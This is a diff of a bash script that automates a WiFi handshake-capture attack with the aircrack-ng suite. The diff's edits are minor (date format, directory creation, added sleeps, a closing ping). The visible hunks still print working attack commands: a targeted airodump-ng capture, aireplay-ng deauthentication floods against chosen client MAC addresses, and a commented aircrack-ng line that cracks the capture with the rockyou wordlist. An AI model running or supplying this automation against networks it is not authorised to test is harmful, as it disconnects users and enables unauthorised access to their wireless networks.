@@ -1,6 +1,6 @@
 #!/bin/bash
 
-CURRENT_DATETIME=$(date +"%Y-%m-%d_%H:%M:%S")
+CURRENT_DATETIME=$(date +"%a_%d-%m-%Y__%H:%M")
 # تعريف الألوان
 BLUE='\033[1;34m'
 YELLOW='\033[1;33m'
@@ -21,7 +21,7 @@ echo -e "$SEPARATOR"
 echo -e "${BLUE}[INFO] Change Directory to Other${NC}"
 echo -e "$SEPARATOR"
 
-cd /mnt/hdd/HS/
+mkdir -p /mnt/hdd/HS/ && cd /mnt/hdd/HS/
 sleep 1
 pwd
 sleep 1
@@ -98,13 +98,15 @@ sleep 1
 echo -e "$SEPARATOR"
 
 
-
+sleep 5
 
 read -p "$(echo -e ${BLUE}[INFO] Enter The MAC of Target : ${NC})" target_bssid
-
+sleep 2
 channel=$(awk -F, -v bssid="$target_bssid" '$1 == bssid {print $4}' scan-01.csv)
 
+sleep 5
 rm -rf scan*
+sleep 1
 echo -e "$SEPARATOR"
 echo -e "${CYAN}[INFO] Running targeted Airodump-ng...${NC}"
 echo -e "$SEPARATOR"
@@ -121,13 +123,15 @@ pwd
 echo -e "$SEPARATOR"
 sleep 1
 echo -e "$SEPARATOR"
+
 read -p "$(echo -e ${BLUE}[INFO] Enter The MAC OF Client 1: ${NC})" client1
 read -p "$(echo -e ${BLUE}[INFO] Enter The MAC OF Client 2: ${NC})" client2
+
 sleep 1
 echo -e "$SEPARATOR"
 echo -e "${GREEN}[INFO] Starting aireplay-ng attacks...${NC}"
 echo -e "$SEPARATOR"
-xterm -geometry 80x24+0+0 -e "echo "$PASSWORD" | sudo -S timeout 2m airodump-ng wlan0 --bssid $target_bssid --channel $channel --write "${target_bssid}_${CURRENT_DATETIME}" --output-format cap,csv; exit;" &
+xterm -geometry 80x24+0+0 -e "echo "$PASSWORD" | sudo -S timeout 2m airodump-ng wlan0 --bssid $target_bssid --channel $channel --write "${CURRENT_DATETIME}" --output-format cap,csv; exit;" &
 sleep 1
 xterm -geometry 80x12+960+0 -e "sleep 17; sudo aireplay-ng -0 30 -a $target_bssid -c $client1 wlan0; exit;" &
 sleep 1
@@ -177,4 +181,4 @@ echo -e "${GREEN}[INFO] Process Completed Successfully!${NC}"
 echo -e "$SEPARATOR"
 sleep 1
 #sudo aircrack-ng -w '/mnt/hdd/Wordlists/Passwds/rockyou.txt'  ${bssid}_${CURRENT_DATETIME}-01.cap  -p 1 
-
+ping -c 4 google.com
